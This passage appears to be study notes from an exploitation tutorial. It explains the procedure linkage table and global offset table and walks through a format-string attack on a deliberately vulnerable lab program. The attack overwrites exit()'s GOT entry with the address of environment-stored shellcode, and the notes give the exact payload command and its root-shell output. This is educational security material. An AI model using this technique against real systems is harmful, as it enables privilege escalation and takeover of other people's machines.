Since a program could use a function in a shared library many times, it's useful to have a table to reference all the functions
Another special section in compiled programs is used for this purpose--the procedure linkage table(PLT)

This section consists of many jump instructions, each one corresponding to the address of a function
It works like a springboard--each time a shared function needs to be called, control will pass through the PLT

An object dump disassembling the PLT section in the vulnerable format string program (fmt_vuln.c) shows these jump instructions:
__________________________________________________________________________________
reader@hacking:~/booksrc $ objdump -d -j .plt ./fmt_vuln

./fmt_vuln:      file format elf32-i386

Disassembly of section .plt:

080482b8 <__gmon_start__@plt-0x10>:
80482b8:      ff 35 6c 97 04 08     pushl     0x804976c 
80482be:      ff 25 70 97 04 08     jmp     *0x8049770 
80482c4:      00 00                 add     %al,(%eax) 
       ...

080482c8 <__gmon_start__@plt>:
80482c8:      ff 25 74 97 04 08     jmp     *0x8049774 
80482ce:      68 00 00 00 00        push     $0x0 
80482d3:      e9 e0 ff ff ff        jmp     80482b8 <_init+0x18> 

080482d8 <__libc_start_main@plt>:
80482d8:      ff 25 78 97 04 08     jmp     *0x8049778 
80482de:      68 08 00 00 00        push     $0x8 
80482e3:      e9 d0 ff ff ff        jmp     80482b8 <_init+0x18> 

080482e8 <strcpy@plt>:
80482e8:      ff 25 7c 97 04 08     jmp     *0x804977c 
80482ee:      68 10 00 00 00        push     $0x10 
80482f3:      e9 c0 ff ff ff        jmp     80482b8 <_init+0x18> 

080482f8 <printf@plt>:
80482f8:      ff 25 80 97 04 08     jmp     *0x8049780 
80482fe:      68 18 00 00 00        push     $0x18 
8048303:      e9 b0 ff ff ff        jmp     80482b8 <_init+0x18> 

08048308 <exit@plt>:
8048308:      ff 25 84  97 04 08     jmp     *0x8049784 
804830e:      68 20 00  00 00        push     $0x20 
8048313:      e9 a0 ff  ff ff        jmp     80482b8 <_init+0x18> 
__________________________________________________________________________________

One of these jump instructions is associated with the exit() function, which is called at the end of the program
If the jump instruction used for the exit() function can be manipulated to direct the execution flow into shellcode instead of the exit() function, a root shell will be spawned
Below, the procedure linking table is shown to be read only
__________________________________________________________________________________
reader@hacking:~/booksrc $ objdump -h ./fmt_vuln | grep -A1 "\ .plt\ "
10 .plt           00000060 080482b8 080482b8 000002b8 2**2
                  CONTENTS, ALLOC, LOAD, READONLY, CODE
__________________________________________________________________________________

But closer examination of the jump instructions(marked below) reveals that they aren't jumping to addresses but to pointers to addresses
For example, the actual address of the printf() function is stored as a pointer at the memory address 0x08049780, and the exit() function's address is stored at 0x08049784
__________________________________________________________________________________
080482f8 <printf@plt>:
                                           -=-=-=-=-=-=
80482f8:      ff 25 80 97 04 08     jmp     *0x8049780 
                                           -=-=-=-=-=-=
80482fe:      68 18 00 00 00        push     $0x18 
8048303:      e9 b0 ff ff ff        jmp     80482b8 <_init+0x18> 

08048308 <exit@plt>:
                                           -=-=-=-=-=-=
8048308:      ff 25 84 97 04 08     jmp     *0x8049784 
                                           -=-=-=-=-=-=
804830e:      68 20 00 00 00        push     $0x20 
8048313:      e9 a0 ff ff ff        jmp     80482b8 <_init+0x18> 
__________________________________________________________________________________

These addresses exist in another section, called the global offset table(GOT), which is writable
These addresses can be directly obtained by displaying the dynamic relocation entries for the binary by using objdump
__________________________________________________________________________________
reader@hacking:~/booksrc $ objdump -R ./fmt_vuln

./fmt_vuln:       file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET       TYPE                 VALUE 
08049764     R_386_GLOB_DAT       __gmon_start__ 
08049774     R_386_JUMP_SLOT      __gmon_start__ 
08049778     R_386_JUMP_SLOT      __libc_start_main 
0804977c     R_386_JUMP_SLOT      strcpy 
08049780     R_386_JUMP_SLOT      printf 
08049784     R_386_JUMP_SLOT      exit 
__________________________________________________________________________________

This reveals that the address of the exit() function(last line) is located in the GOT at 0x08049784
If the address of the shellcode is overwritten at this location, the program should call the shellcode when it thinks it's calling the exit() function

As usual, the shellcode is put in an environement variable, its actual location is predicted, and the format string vulnerability is used to write the value
Actually, the shellcode should still be located in the environment from before, meaning that the only things that need adjustment are the first 16 bytes of the format string
The calculations fot the %x format parameters will be done once again for clarity
In the output below, the address of the shellcode (1) is written into the address of the exit() function(2)
__________________________________________________________________________________
reader@hacking:~/booksrc $ export SHELLCODE=$(cat shellcode.bin)
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./fmt_vuln
SHELLCODE will be at 0xbffff9ec
reader@hacking:~/booksrc $ gdb -q
(gdb) p 0xbfff - 8
$1 = 49143
(gdb) p 0xf9ec - 0xbfff
$2 = 14829
(gdb) quit
reader@hacking:~/booksrc $ objdump -R ./fmt_vuln

./fmt_vuln:       file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET       TYPE                 VALUE 
08049764     R_386_GLOB_DAT       __gmon_start__ 
08049774     R_386_JUMP_SLOT      __gmon_start__ 
08049778     R_386_JUMP_SLOT      __libc_start_main 
0804977c     R_386_JUMP_SLOT      strcpy 
08049780     R_386_JUMP_SLOT      printf 
08049784     R_386_JUMP_SLOT      exit 


reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\x86\x97\x04\x08\x84\x97\x04\x08")%49143x%4\$hn%14829x%5\$hn
The right way to print user-controlled input:
????%49143x%4$hn%14829x%5$hn
The wrong way to print user-controlled input:
????



                                                b7fe75fc
[*] test_val @ 0x08049794 = -72 0xffffffb8
sh-3.2# whoami
root
sh-3.2#
__________________________________________________________________________________

When fmt_vuln.c tries to call the exit() function, the address of the exit() function is looked up in the GOT and is jumped to via the PLT
Since the actual address has been switched with the address for the shellcode in the environment, a root shell is spawned

Another advantage of overwriting GOT is that the GOT etries are fixed per binary, so a different system with the same binary will have the same GOT entry at the same address

The ability to overwrite any arbitrary address opens up many possibilities for exploitation
Basically, any section of memory that is writable and contains an address that directs the flow of program can be targeted

__________________________________________________________________________________
____________________________________Summary_______________________________________

The PLT contains the jump instructions, corresponding to the addresses of all the functions from shared libraries
We see that the PLT contains the jump instructions associated with exit() fuction
If we can overwrite the jump address for the exit function to address of shellcode, we could spawn a root shell
But, with the header tag, we can see that the PLT is read-only
Upon closer look, we see that the jump instructions aren't jumping to addresses, but to pointers to addresses
The pointers and their corresponding addresses exist in the global offset table(GOT), which is writable
We can view them with objdump -R(dynamic relocation entry/functions from shared library/ies)
We see that the exit function is located at 0x08049784 in the GOT and contains the address of the exit function
We then overwrite the content of 0x08049784 to contain address of the shellcode in the environment variables